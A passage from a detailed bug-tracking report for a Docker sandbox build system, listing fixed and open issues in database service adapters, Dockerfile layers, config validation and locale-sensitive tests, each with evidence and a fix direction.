- **Duplicate of TST-1** (which also covers the second affected test, `tests/test-falsify-run.sh`); fix once (batch 7).
- Severity: LOW — Confidence: CONFIRMED
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``
- What's wrong: the helper sorts with the caller's locale, but the expected strings are hand-written in byte (C) order. glibc's en_US.UTF-8 ignores punctuation at the primary level, so `docs-archive--wc-projA` sorts before `docs--wc-projA`. The product does not depend on order: gc removes in docker's listing order, and the report and list sorts use `LC_ALL=C`. All other tests in this area pass under en_US.UTF-8.
- Evidence: `LC_ALL=en_US.UTF-8 bash tests/test-repo-destructive.sh` → rc=2, `FAIL: gc --yes removes every working copy…` and `FAIL: gc --unused keeps the in-use copy…`. Under C.UTF-8 it passes.
- Fix direction: `LC_ALL=C sort` in `removed()`, and in the `sort -u` near the end of the same file.

### PRJ-8: Migration 002 writes a major-only `openjdk=21`, which build.sh then refuses
- **Status: FIXED (batch 4)** — `3349604` (the value is kept, so `build.sh` still refuses it, but the hook now writes a comment and prints a NOTE saying what to complete).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrations/002-openjdk-single-key.sh: \`printf 'openjdk=%s\n' "$merged"\`` vs `build.sh` (`looks like a major version only`)
- Introduced: 24e093a (pre-window).
- What's wrong: `openjdk-21=ON` is migrated to `openjdk=21`. build.sh's validate_config rejects any SDKMAN version without a `.`, so the first build after a sync fails. The error is clear but the migration itself caused it. Old code, and it only affects projects that predate the openjdk split.
- Fix direction: have the hook map each major to a full identifier or emit an empty value plus a comment, or have it print a notice that the value must be completed.

### PRJ-9: Timestamped `*.pre-migrate.<ts>` backups are not gitignored
- **Status: FIXED (batch 4)** — `0213e86` (`*.pre-migrate.*` in init's and sync's patterns).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrate-runme.sh: \`bk="${f}.pre-migrate.$(date -u +%Y%m%dT%H%M%SZ)"\`` vs the ignore pattern `'*.pre-migrate'` in project-init.sh and `sync-to-projects.sh: \`ensure_inner_gitignore()\``
- What's wrong: the `.pre-init` backups have a wildcard pattern (`sandbox.local.env.pre-init*`); the second-generation `.pre-migrate.<ts>` backups do not. Those backups include `sandbox.local.env.pre-migrate.<ts>` (this machine's absolute mount paths) and the old fat runme.sh. In a project that tracks `.ai-containers/`, they show up as committable.
- Fix direction: add `*.pre-migrate.*` (or change the pattern to `*.pre-migrate*`) in both places.


## 5. In-container DB services

### SVC-1: The MySQL/MariaDB admin client obeys the app's `MYSQL_HOST` / `MYSQL_TCP_PORT` / `MYSQL_PWD` from container.env, so the start fails or the admin SQL goes to another server
- **Status: FIXED (batch 5)** — `657cb29`. The admin client runs without the app's `MYSQL_*`/`LIBMYSQL_*` (`services.d/mysql.sh: _mysql_client()`, used by MariaDB's readiness probe too) or `PG*` variables (`services.d/postgres.sh: _pg_sql()`). Not `--protocol=SOCKET`: measured, with `MYSQL_HOST` set MySQL 8.0 refuses it (`ERROR 2047 Wrong or unknown protocol`) and MariaDB 10.11 ignores it. Redis left as it is: with `REDISCLI_AUTH` set, `redis-cli` prints the AUTH error and `INFO` still answers (rc 0), so readiness is unaffected. Tests: mysql D15, mariadb D12, postgres D22.
- Severity: MEDIUM — Confidence: CONFIRMED (client behaviour reproduced; the adapter consequence follows from the code)
- Location: `services.d/mysql.sh: _mysql_sql()` (`"$MYSQL_CLIENT" --no-defaults -uroot --socket="$(_mysql_sock)" -e "$1"`), `services.d/mariadb.sh: _mariadb_pid_file()` (same flags)
- Introduced: bc86420 (mysql), b058bed (mariadb)
- What's wrong: The adapters keep their own knobs under `AI_SERVICES_MYSQL_*` / `AI_SERVICES_MARIADB_*` so that the app's variables cannot move the server (AGENTS.md; mutations 794/813 test `MYSQL_PORT`). The clients the adapters run, though, read the environment themselves, and `start` gets all of container.env. `--no-defaults` turns off option files only, not environment variables. The client calls pass `--socket` but no `-h`/`--protocol`, so a `MYSQL_HOST` in the environment switches the connection to TCP to that host, ignoring `--socket`. `MYSQL_TCP_PORT` then picks the port, and `MYSQL_PWD` sends a password that root, which has none, rejects.
- Failure scenario: a `container.env` copied from a docker-compose setup with `MYSQL_HOST=db`, or the leftover `MYSQL_HOST=host.docker.internal` that docs/components/mysql.md itself anticipates ("Moving from a database on the host?"):
  - mysql: `mysqld --daemonize` succeeds, then `_mysql_create_self` fails (`ERROR 2005 Unknown MySQL server host 'db'`), so `svc_start` returns 1. The runner prints "mysql failed to start", but the server is in fact running, and `MYSQL_USERS`/`MYSQL_DATABASES` are never provisioned.
  - mariadb: `_mariadb_pid_file` never matches, so the loop spins for the full 30 s and then reports "mariadbd did not answer". The server keeps running anyway (nothing kills it on that path).
  - In open/discovery mode with `MYSQL_HOST=host.docker.internal`, `CREATE USER … GRANT ALL … WITH GRANT OPTION` and `ALTER USER 'root'@'localhost' IDENTIFIED BY …` are sent to the host's real MySQL as root. They succeed only if that root takes TCP logins with no password, which is unlikely but the wrong target either way.
- Evidence (in `ubuntu:24.04` with `mysql-client-core-8.0`, and again with `mariadb-client-core`):
  ```
  mysql --no-defaults -uroot --socket=/tmp/x.sock -e "select 1"                  → ERROR 2002 Can't connect … through socket '/tmp/x.sock'
  MYSQL_HOST=db mysql --no-defaults -uroot --socket=/tmp/x.sock …                 → ERROR 2005 Unknown MySQL server host 'db'
  MYSQL_HOST=127.0.0.1 MYSQL_TCP_PORT=3307 mysql --no-defaults -uroot --socket=…  → ERROR 2003 Can't connect to MySQL server on '127.0.0.1:3307'
  MYSQL_HOST=db mariadb --no-defaults -uroot --socket=/tmp/x.sock -N -B -e …      → ERROR 2005 Unknown server host 'db'
  ```
- The same class, not reproduced, lower likelihood:
  - `REDISCLI_AUTH` makes `redis-cli` in `services.d/redis.sh: _redis_info_pid()` send AUTH to a server with no password. Redis 7 refuses that, so readiness never passes and the start fails after 30 s.
  - `PGHOSTADDR` overrides psql's `-h <socket dir>` in `_pg_sql()` and connects over TCP to that address.
- Fix direction: run the adapters' client calls under `env -u MYSQL_HOST -u MYSQL_TCP_PORT -u MYSQL_PWD -u MYSQL_UNIX_PORT` and add `--protocol=SOCKET`. Do the same for `REDISCLI_AUTH` (redis-cli) and `PGHOSTADDR`/`PGSERVICE` (psql). Add a hermetic test that sets `MYSQL_HOST` and checks that the fake client's argv/env still targets the socket.

### SVC-2: On an x86-64 CPU without AVX, mongo is reported as "this image has no mongo server. Rebuild", not as a start failure with the log
- **Status: FIXED (batch 5, hermetic half)** — `657cb29`, `a49e562`. A `mongod` that cannot run reads as `unknown`, and its start fails before the server is launched, logging the exit status, the signal and the AVX hint; the adapter contract in AGENTS.md allows `unknown`. Test: mongo D10 (a fake that dies of SIGILL). Confirmation on real non-AVX hardware is still PLAT-4.
- Confirmation needs non-AVX hardware: tracked as PLAT-4 in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md), closed 2026-11-03 as not supported (no such hardware available; docs/components/mongo.md says so). The hermetic half of the fix can be done in batch 5.
- Severity: LOW — Confidence: PLAUSIBLE (not reproduced; needs a non-AVX CPU, e.g. a Proxmox/KVM guest with the `kvm64` CPU type)
- Location: `services.d/mongo.sh: svc_installed_version()` (`"$MONGO_MONGOD" --version 2>/dev/null | sed -n …`), together with `start-services.sh: start_one()` (`warn "sandbox.conf has $name=$value, but this image has no $name server. Rebuild: ./build.sh"`)
- Introduced: e3c9b15
- What's wrong: docs/components/mongo.md says: "a CPU or an emulator without it stops `mongod` with `Illegal instruction`, and the start says it failed, with the log." MongoDB ≥5.0's x86-64 binaries die with SIGILL during early start-up, and that includes `mongod --version`. The version probe therefore prints nothing, and the runner takes an empty version to mean "not installed".
- Failure scenario: `mongo=ON`, the image is built and run on a non-AVX host. The user sees the "Rebuild: ./build.sh" warning, rebuilds, and gets the same warning. No log is written and no SIGILL is mentioned anywhere.
- Fix direction: decide "installed" by `[[ -x "$MONGO_MONGOD" ]]`, and if the version probe then fails, report it (for example "mongod exists but cannot run: exit 132 (Illegal instruction — needs AVX)"). Alternatively, correct the doc.

### SVC-3: Empty entries in `POSTGRES_ROLES` / `POSTGRES_DATABASES` warn about `''`
- **Status: FIXED (batch 5)** — `657cb29`. Empty entries are skipped quietly; `:owner` is still warned about. Test: postgres D23; D8 no longer counts the empty entry.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `services.d/postgres.sh: svc_provision()`. Neither loop has an empty-entry skip; mysql.sh has `[[ -n "$entry" ]] || continue`.
- Introduced: d337c61 / d7cdb75
- What's wrong: `a,,b`, or a trailing `, ` (the `IFS=, read -ra` split keeps a whitespace-only last field), produces an empty name, which then fails the regex and is warned about. The MySQL adapter skips empties silently, and so does the runner's own `each_service` for `AI_SERVICES`.
- Evidence: `POSTGRES_ROLES='app_user,,other' POSTGRES_DATABASES='db1, '` against the adapter with a fake psql printed:
  ```
  WARNING: POSTGRES_ROLES: '' is not a valid role name (lowercase letters, digits, _) — skipped
  WARNING: POSTGRES_DATABASES: '' is not name or name:owner (lowercase letters, digits, _) — skipped
  ; roles: app_user, other; databases: db1
  ```
- Fix direction: add `[[ -n "$name" ]] || continue` (and the same on the trimmed entry) to both loops, as mysql.sh does.


### SVC-4: MariaDB's character-set probe reads an app's `MYSQL_HOME` and the sandbox user's `~/.my.cnf`
- **Status: FIXED** (2026-10-27). The probe is now `"$MYSQL_MYSQLD" --defaults-file="$MARIADB_DEFAULTS" --print-defaults`, the file `/etc/mysql/my.cnf` (`AI_SERVICES_MARIADB_DEFAULTS_FILE` for the tests). The path was checked for both shapes: Ubuntu 24.04's 10.11 and MariaDB's 11.4 (the official `mariadb:11.4` image, built from MariaDB's repository) each have it as an alternatives link to `mariadb.cnf`, and with `MYSQL_HOME` pointing at a `character-set-server=bogus` file and the same line in `~/.my.cnf`, the bare probe printed `bogus` twice, the fixed one the package's options only. The hermetic fake now answers a probe without `--defaults-file` as the real one does; D4 asserts the file and the absence of the app's value, red on the old adapter. The falsify target scores 12 killed of 12. Mutation `813-mariadb-port-from-app-env` was regenerated for the moved context. The review of this fix found no HIGH or MEDIUM; its LOW left open is SVC-5.
- Found by the review of batch 5, LOW-1; predates batch 5
- Severity: LOW — Confidence: CONFIRMED (measured in ubuntu:24.04 with mariadb-server 10.11)
- Location: `services.d/mariadb.sh: svc_start()`, the `"$MYSQL_MYSQLD" --print-defaults` call that reads back the package's character-set options.
- What's wrong: that call has neither `--no-defaults` nor `--defaults-file`, so it also reads `$MYSQL_HOME/my.cnf` or `$MARIADB_HOME/my.cnf` (both settable from `container.env`) and `~/.my.cnf`. A `character-set-server`/`collation-server` there is kept by the `mapfile`, comes later on `mariadbd`'s command line and wins; a bad value stops the server from starting.
- Evidence: with `[mysqld] character-set-server=bogus` in `/tmp/mh/my.cnf`, `MYSQL_HOME=/tmp/mh mariadbd --print-defaults` printed `--character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci --character-set-server=bogus …`; with `--defaults-file=/etc/mysql/my.cnf` added, only the package's two.
- Fix direction: `--defaults-file=/etc/mysql/my.cnf --print-defaults` (made overridable for the tests, like the adapter's other paths), after checking that path for a pinned series from MariaDB's own repository, which the review did not.

## 6. Build, Dockerfile, tools.d and config validation

### BLD-1: db-clients=mongo layer can fail and still report a successful build
- **Status: FIXED (batch 6)** — `1aea53e` (the arm fails the layer, `--error-on=any`, `test -x /usr/bin/mongosh`); `tests/test-dockerfile-layers.sh` runs the layer's own text; the real layer installed mongosh 2.14.0 in ubuntu:24.04.
- Severity: MEDIUM — Confidence: CONFIRMED (shell semantics reproduced; not run in a docker build). **Triage correction:** the failure is silent only when a step *before* the final `apt-get install` fails (key fetch, `gpg --dearmor`, writing the list). The final `apt-get install` is the last command of the `&&` list, so `set -e` does stop on it: an "Unable to locate package" after a plain `apt-get update` that ignored a broken repo **does** fail the build. The fix direction is unchanged.
- Location: `Dockerfile: \`apt-get update && apt-get install -y --no-install-recommends mongodb-mongosh ;;\`` (DB_CLIENTS layer)
- Introduced: 286790e (pre-window). The window touched the neighbouring mongo work (e3c9b15) without fixing it.
- What's wrong: The `mongo)` arm is one `&&` list: `curl … | gpg --dearmor … && echo … > list && apt-get update && apt-get install … mongodb-mongosh`. Under `set -e`, bash ignores a failure anywhere in an `&&` list except the last command. The list also sits inside a `for`/`case`, and `; done; rm -rf /var/lib/apt/lists/*;` runs after it. So the layer's exit status is the `rm`'s, which is 0. The pg and mysql arms are single simple commands, so `-e` does stop on those.
- Failure scenario: `db-clients=mongo`, and any step of the arm fails. Examples: pgp.mongodb.com still failing after 5 retries, a gpg error, or repo.mongodb.org not loading. Plain `apt-get update` exits 0 when that happens, and the next `apt-get install` fails with "Unable to locate package". Every one of these ends with `docker build` succeeding, an image with no `mongosh`, and the build toolchain still kept. The `mongo=` server layer just below uses `--error-on=any` and `test -x /usr/bin/mongosh` to fail closed in exactly this situation.
- Evidence: `bash -euo pipefail -c 'for c in mongo; do case "$c" in mongo) false | cat && echo next ;; esac; done; echo "REACHED rm"'` prints `REACHED rm` and exits 0.
- Fix direction: Make the arm fail the layer, either `( … ) || exit 1` around it or `… || { echo "mongosh install failed" >&2; exit 1; }`. Also add `--error-on=any` and a final `test -x /usr/bin/mongosh`, as the server layer does.

### BLD-2: SDKMAN multi-version installs: a bad version that is not last is silently skipped
- **Status: FIXED (batch 6)** — `1aea53e` (`|| exit 1` in all seven SDKMAN loops; real SDKMAN returns 1 for an unknown version, checked by the review); `tests/test-dockerfile-layers.sh`, made discriminating in `05fec4f`.
- Severity: MEDIUM — Confidence: PLAUSIBLE (loop semantics reproduced; `sdk install`'s exit code on an unknown version not run here)
- Location: `Dockerfile: \`for ver in $OPENJDK_VERSIONS; do sdk install java \${ver}-tem; done"\`` (the same pattern is in the graalce, graal, kotlin, scala, maven and gradle layers)
- Introduced: 8c4bd08 (pre-window, untouched ancient code)
- What's wrong: Each loop runs inside a nested `bash -c "…"`. That child bash does not inherit the Dockerfile `SHELL`'s `-e`, so the loop's status is the status of its last iteration. `validate_config` only checks that each version contains a `.`.
- Failure scenario: `openjdk=21.0.5,17.0.99` (a typo in a version that is not first), or `maven=3.9.9,3.9.99`. The bad `sdk install` prints "Stop! … is not available" and returns non-zero. The next iteration succeeds, the layer is green, and the image lacks the version `sandbox.conf` asked for. A bad *first* openjdk/graal version is caught only by accident, by the later `sdk default java <first>`. A bad version for kotlin/scala/maven/gradle is caught only when it is the last in the list.
- Evidence: `bash -euo pipefail -c 'bash -c "for v in bad good; do [ \$v = good ]; done" && echo "layer would succeed"'` prints `layer would succeed`.
- Fix direction: Use `bash -ec "…"`, or `sdk install … || exit 1` inside each loop.

### BLD-3: install=repo-file installs the binary as mode 0711 (not readable by the agent)
- **Status: FIXED (batch 6)** — `aeffa17` (every install path sets 0755); `tests/test-tools-d.sh`. See BLD-8 for the assertions.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if ! mv "$tmp" "$dest" || ! chmod +x "$dest"; then\`` in `install_repo_file()`
- Introduced: in the window, with the repo-file install path
- What's wrong: `tmp` comes from `mktemp`, which creates the file 0600. `mv` keeps that mode, and `chmod +x` under umask 022 only adds the x bits, giving 0711. The sandbox user, who is not root, can execute an ELF file at that mode but cannot read it. A script binary (shell, Python zipapp) fails with `Permission denied`, and `file`, `sha256sum` and copying the binary also fail. `install_url` gets 0755 only because curl creates its file under the umask. This is latent in this repo, which ships no repo-file tool, but live in the mgd port (acli-pii is install=repo-file). `tests/test-tools-d.sh` checks only `-x` as the owner, so it cannot see the problem.
- Evidence: fake curl plus `TOOL_VERSIONS=pub=latest` with an `install=repo-file` descriptor → `stat -c %a` on the installed binary prints `711`.
- Fix direction: `chmod 0755 "$dest"` (or use `install -m 0755`). Add a test that asserts the other-read bit is set.

### BLD-4: Private release path still falls back to an anonymous API request with a stale token
- **Status: FIXED (batch 6)** — `d4383c1` (`api_get … required` from the private release branch).
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`if [ -z "$body" ] && [ -n "${AUTH_ARGS[*]+set}" ] && [ "${#AUTH_ARGS[@]}" -gt 0 ]; then\`` in `api_get()`, called from the `private=yes` branch of `install_one()`
- Introduced: in the window (anonymous fallback in aa662ad; c4abf76 fixed only `install_repo_file`)
- What's wrong: The file's own rule says "ONLY WHERE THE TOKEN IS OPTIONAL … the private release-asset path therefore has no fallback". c4abf76 applied that rule to repo-file. `api_get` still makes the anonymous retry for every caller, including private release resolution.
- Failure scenario: a `private=yes` release tool with a stale or un-SSO'd token. There are 3 authenticated attempts, then one anonymous request that cannot succeed. The build then prints "API request failed with a credential; retrying anonymously (is GITHUB_TOKEN stale?)", which is the misleading diagnostic c4abf76 removed elsewhere.
- Evidence: fake curl that always fails, descriptor `repo=acme/secret private=yes`, `GITHUB_TOKEN=stale`. The call log shows 3 calls with `Authorization` and a 4th without it.
- Fix direction: Pass a "no anonymous fallback" flag to `api_get` from the private branch, or check `TOOL_private` inside it.

### BLD-5: AGENTS.md says a pinned acli value is "refused"; it is installed as latest with a NOTE
- **Status: FIXED (batch 6)** — `7e1771a` (a pin of an `install=url` tool without `${VERSION}` is refused; `latest` accepted in `05fec4f`); `tests/test-validate-config.sh`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `install-tools.sh: \`echo "NOTE: ${name}=${version} cannot be pinned: its url= has no \${VERSION} placeholder." >&2\``; `build.sh: \`tool_versions_arg()\``; AGENTS.md: "so its grammar is `ON | OFF` and a pinned value is refused rather than silently ignored"
- What's wrong: Nothing refuses the value. `validate_config` has no tools.d check, and `tool_versions_arg` passes `acli=1.3.22` through. `install_url` prints a NOTE that is easy to miss in the build log, then installs whatever `/latest/` currently serves. A user who reads AGENTS.md will think a pin was either honoured or rejected.
- Evidence: `sandbox.conf` with `acli=1.3.22` → `validate_config` passes and `tool_versions_arg` → `acli=1.3.22;…`.
- Fix direction: Refuse a non-ON/OFF value in `validate_config` for a tool whose `url=` has no `${VERSION}` (and whose install is not release), or correct AGENTS.md to describe the NOTE behaviour.

### BLD-6: A lowercase `off`/`on` passes validation for most keys; `ruby=off` brings back the exact ruby=OFF defect
- **Status: FIXED (batch 6)** — `7e1771a`, moved into `check_config` (which `sandbox.sh` runs too, since ruby installs at run time) in `05fec4f`; `tests/test-validate-config.sh`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`has_versions()\`` / `version_list()` (they normalise only the literal `OFF`); `build.sh: \`validate_config()\`` (case-checks only playwright and the server keys)
- What's wrong: The OFF normalisation compares against the literal `OFF`, and `validate_config` adds case checks only for playwright, postgres, redis, mysql, mongo and mariadb.
- Failure scenario:
  - `ruby=off`: `has_versions ruby` is true. That gives KEEP_BUILD_TOOLCHAIN=1, RUBY_RUNTIME=1, `RUBY_VERSIONS=off` in the container and an rvm volume, and `rvm install off` fails on every start. This is exactly the failure AGENTS.md describes for `ruby=OFF`.
  - `dtctl=on`: `TOOL_VERSIONS=dtctl=on`, then download tag `von`, a non-fatal WARNING, and an image without dtctl.
  - `c-toolchain=on`: silently OFF.
  - rust, go, node and python with `off` fail the build loudly, so they cause no silent harm.
- Evidence: `sandbox.conf` with `ruby=off dtctl=on c-toolchain=on` → `validate_config` passes, `tool_versions_arg` prints `dtctl=on`, `is_enabled c-toolchain` is false, and `version_list ruby` prints `off`.
- Fix direction: Apply the playwright-style "must be written in capitals" check generically to every key whose value case-folds to ON/OFF.

### BLD-7: AGENTS.md says rust and go accept comma-separated version lists; they accept one value
- **Status: FIXED (batch 6)** — `7e1771a` (a list is refused for rust and go; AGENTS.md corrected).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: AGENTS.md: "Version-list components (`node`, `python`, `ruby`, `rust`, `go`) accept comma-separated version values"; `build.sh: \`_args+=(--build-arg "GO_VERSION=$ver")\`` and `RUST_TOOLCHAIN=$ver`
- What's wrong: Neither value is split. `go=1.24.2,1.23.1` produces `https://go.dev/dl/go1.24.2,1.23.1.linux-amd64.tar.gz`, a 404. `rust=stable,nightly` gives `rustup --default-toolchain "stable,nightly"`. `validate_config` does not reject the comma, as it does for angular-cli and playwright. `sandbox.conf`'s own comments describe a single value.
- Failure scenario: a user follows AGENTS.md and the build fails with an error that names a strange URL rather than the key.
- Fix direction: Correct AGENTS.md, and add a comma refusal for rust and go in `validate_config`.


### BLD-8: Leftovers of the batch 6 reviews
- **Status: PARTLY FIXED** (2026-10-28). Fixed: the `install=url` mode assertion runs under `umask 077`, where a `chmod +x` revert gives 0700, and the release path has one now (`tests/test-tools-d.sh`, a pinned `rel` descriptor and a fake `curl`); both red with `chmod +x`. The per-key lowercase messages in `build.sh: validate_config()` (playwright, postgres, mongo, mariadb, and `validate_server_on_off()` for redis and mysql) are deleted, and the five server tests and the playwright one run `check_config; validate_config` as `build_image()` does, so they assert the message a user sees. `check_config` refuses an unreadable `sandbox.conf` by name (`tests/test-validate-config.sh`, non-root; red on the old code, which passed it with every key unset). The loop's cost is fixed too (2026-10-29): each value is read from its own line in bash, as `get_versions()` reads it, with no process per key; `check_config` went from about 214 ms to 8 ms, and a grep shim in `tests/test-validate-config.sh` requires two calls for the 45 keys (47 on the old code), beside spacing, comment and CR cases. The CHANGELOG line is in Unreleased since `c761628`. Left by design: the `--error-on=any` trade, kept as the server layers make it.
- Severity: LOW/NIT
- The `install=url` 0755 assertion does not catch a revert to `chmod +x`: the archive member is 0644 and the test runs under umask 022, so `+x` gives 0755 too. Run that install under `umask 077` (or make the member 0600). The release path's chmod has no mode assertion at all.
- `check_config` now runs before `validate_config`, so the per-key lowercase messages in build.sh (playwright, postgres, redis, mysql, mongo, mariadb) are unreachable from `./build.sh`; users get the generic one, which still names the key. The per-server tests call `validate_config` alone and so assert messages no user sees. Delete the branches and route those tests through `check_config; validate_config`, or mark them unreachable.
- The per-key loop in `check_config` costs ~0.1 s per launch and build on Linux (one `get_versions` fork set per key), likely more on macOS; a single pure-bash pass would do.
- An unreadable sandbox.conf passes `check_config` (it tests `-f` only).
- A synced project with a latent lowercase build-time key (`c-toolchain=on`) can no longer launch until it is fixed (intended; the message gives the corrected line). Worth a CHANGELOG line at the next release.
- `--error-on=any` on the db-clients=mongo arm fails the build on any broken apt source (the same trade the PGDG, MariaDB and MongoDB server layers make).

### BLD-9: a Node LTS release day can fail every image build for hours: nvm finds no checksum to compare
- **Status: FIXED** (2026-10-29). The nvm layer's loop moved into `install-node-lts.sh`, which the layer copies in and runs (a shared file; `tests/test-build-fetch-retry.sh` reads it with the layer). It keeps the clean slate and the retries, and once `nvm install --lts` has failed TWICE with "Provided checksum to compare to is empty.", installs the LTS release before the newest (the same line's previous patch, else the previous line's newest; `sort -V` over `nvm ls-remote --lts`), as the default, with a `WARNING:` naming it and `./build.sh --no-cache` as the way to the newest later. Any other failure, a mismatched checksum above all, is retried and fails the build as before: the first version fell back on any failure from the third attempt, which its review showed could hide a transient error or an integrity signal. `tests/test-install-node-lts.sh` drives it with a fake installer and a fake `nvm` over an out-of-order listing (v8 beside v10, 24.9 beside 24.10): the plain path with `PROFILE=/dev/null`, a new line and a patch release unpublished, the count of unpublished failures however many attempts the clone took, another failure, both failing, the installer failing, the clean slate between attempts, and the usage and backoff knobs.
- Severity: LOW. Confidence: CONFIRMED (Integration on `7652fb5` and `7b9314d`, 17:14 and 17:37 UTC; the build log in the `it-diagnostics` artifact)
- Location: the nvm layer's retry loop around `nvm install --lts`, inline in the Dockerfile then, `install-node-lts.sh: previous_lts()` now
- What's wrong: Node 26.13.0 became LTS ("Lithium") on 2026-10-28. For a while nodejs.org listed it in `index.tab` while nvm found no checksum for its tarball (`Provided checksum to compare to is empty.`), so nvm refused the binary, fell back to a source build, which failed too, and the five attempts (about 2.5 minutes of backoff) all failed the same way. At 18:30 UTC the same layer installed it with `Checksums matched!`. Anyone building the image in that window, not only CI, gets a failed build whose message points at nvm rather than at the release.
- Fix direction: on that message, fall back to the previous LTS line (`nvm install --lts=<previous codename>`, or the newest LTS that `nvm ls-remote --lts` lists before it) and say so, rather than retrying the same release; or note the symptom beside the `GITHUB_TOKEN` advice so a failed build is recognised.

### BLD-10: from Node 26, the image's default node dies at exec: libatomic1 is purged with build-essential
- **Status: FIXED** (2026-10-28). `libatomic1` is installed in the essentials layer, so it is manual and survives both `--auto-remove` purges. Case 310 now runs `node`, `npm` and `npx` (`assert_runs`, which needs `--version` to execute); new mutation `311-libatomic-not-installed` drops the package, and against it case 310 fails on exactly `node`, `npm` and `npx` ("libatomic.so.1: cannot open shared object file") while the other eleven tools pass, on an image built with `--no-cache` (a cache from before 2026-10-28 hands back Node 24 in the nvm layer and the case passes, which the patch header now says). The fixed tree passes cases 000, 310 and 440, whose node servers had never listened. Its review measured the rest: Node 26.13.0 needs `libatomic.so.1` on linux-x64 and linux-arm64 alike (Node 24.22.2 on neither) and nothing else noble lacks; under it qmd, yarn, pnpm, bun, Angular CLI and the Copilot, Codex and Gemini CLIs install and run; nothing in the engine pins the Node major.
- Severity: HIGH. Confidence: CONFIRMED (Integration's re-run on `7b9314d`: every case with a node sidecar, and 440's dev server, timed out; reproduced in ubuntu:24.04)
- Location: `Dockerfile: libatomic1`, in the essentials layer; the cleanup layer's `apt-get purge -y --auto-remove`
- What was wrong: Node 26 became the LTS on 2026-10-28, and its official binaries link `libatomic.so.1`, which ubuntu:24.04 does not ship. The nvm layer installs it without running it; the pyenv layer's `build-essential` brings the library in as a gcc dependency, and the cleanup purge removes it again. An image with none of yarn, pnpm, bun, angular-cli or playwright built with a `node` that died at exec ("libatomic.so.1: cannot open shared object file"), taking `npm`, qmd and every npm-installed agent with it; one with any of them failed to build at that layer's `npm`; only `KEEP_BUILD_TOOLCHAIN` images were unaffected. An image built on 2026-10-28 before this fix needs a rebuild.
- Corepack, decided 2026-10-28 (the user, on a measured recommendation): **not installed**. Node 26 no longer bundles it (Node 24 does); nothing in the engine uses it (`link-node-globals.sh` skips it, no layer runs it), and `corepack enable` never worked for the sandbox user, whose nvm directory is root-owned. Measured as a non-root user in the Node 26 image: `npm install -g corepack` fails `EACCES`; `npx corepack` (0.36.0, cached in `~/.npm`, not group-mounted), a project devDependency (persists in the workspace), `npm install -g --prefix ~/.local` (`~/.local/bin` is on PATH, not mounted) and `corepack enable --install-directory ~/bin` with a pinned `pnpm@9.15.0` all work. The routes are in `docs/components/README.md`; `node=24` gives a project the bundled one. Group-mounting `~/.npm` would make npm's cache and `npx` persist, a separate, optional change.

## 7. Test harness and CI

### TST-1: Hermetic suite fails on a developer host with an en_US.UTF-8 locale (two tests compare a locale `sort` against C-ordered literals)
- **Status: FIXED (batch 7)** — `142dc84`, `aa0c70b` (`LC_ALL=C sort` in both helpers and in `summary_vols`). The `suite` job now runs under `en_US.UTF-8` (asserted to collate differently from C), so the class stays caught; `tests/run-all.sh` deliberately does not pin the locale.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``; `tests/test-falsify-run.sh: \`find "$FR_WORK/w0" -type f 2>/dev/null | sed "s|^$FR_WORK/w0/||" | sort | tr '\n' ' ' )"\``
- Introduced: 92c40dd / 8b9ad30 (2026-08-20/21, test-repo-destructive); the test-falsify-run.sh assertion is in the same class.
- What's wrong: both helpers pipe through a bare `sort`, which follows LC_COLLATE. The expected strings are written in byte (C) order. In en_US.UTF-8, glibc ignores punctuation at the first collation level, so `docs-archive--wc` sorts before `docs--wc` and `a/file1` sorts before `.github/…`. Nothing pins the locale: neither run-all.sh nor the two tests sets LC_ALL. GitHub runners use C.UTF-8, so CI stays green.
- This is a test bug, not a product bug. `repo.sh: \`cmd_gc()\`` removes the same set of volumes either way, and the order has no meaning.
- Failure scenario: on a typical Linux desktop (LANG=en_US.UTF-8), `bash ./verify-on-host.sh` Phase 5 reports "hermetic suite exited 1". Because the symlinked-TMPDIR arm is gated on `h_rc == 0`, that arm then does not run at all.
- Evidence:
  ```
  LC_ALL=en_US.UTF-8 bash tests/run-all.sh repo-destructive
  FAIL: gc --yes removes every working copy, across all repos (expected 'ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|ai-containers-repo-docs-archive--wc-projA|', got 'ai-containers-repo-docs-archive--wc-projA|ai-containers-repo-docs--wc-projA|ai-containers-repo-docs--wc-projB|')
  FAIL: gc --unused keeps the in-use copy …
  full suite under en_US.UTF-8: 98 test(s), 96 passed, 2 failed — test-falsify-run.sh: "a partial cp -a does not nest the seeded tree (expected '.github/workflows/nightly.yml a/file1 ', got 'a/file1 .github/workflows/nightly.yml ')"
  ```
  With LC_ALL=C and with C.UTF-8 both tests pass.
- Fix direction: use `LC_ALL=C sort` in both helpers. Optionally also export `LC_ALL=C` (or `LC_COLLATE=C`) per test in run-all.sh, and add a run under a non-C locale to the suite so the class stays caught.

### TST-2: Layer-containment models nightly wrongly — a PR-selected case that no nightly job runs still passes "PR ⊆ nightly"
- **Status: FIXED (batch 7)** — `be63670` (each layer is the union of one `run.sh --dry-run` per `tests/integration/run.sh` invocation its event runs, read from the workflows by `wf_it_selections()`; nightly must hold the whole corpus; integration.yml's Run step split by event), hardened in `892cdaf` (run: values folded as YAML folds them), `9142ea4`, `931c3fc`, `b3f18d7` and `b0692d7` (an invocation the shell may skip, or in a job with `needs:`, is refused by name). Tests in `tests/test-layer-checks-parser.sh`; the review's planted 799 and the deleted packages-services job both fail the guard.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
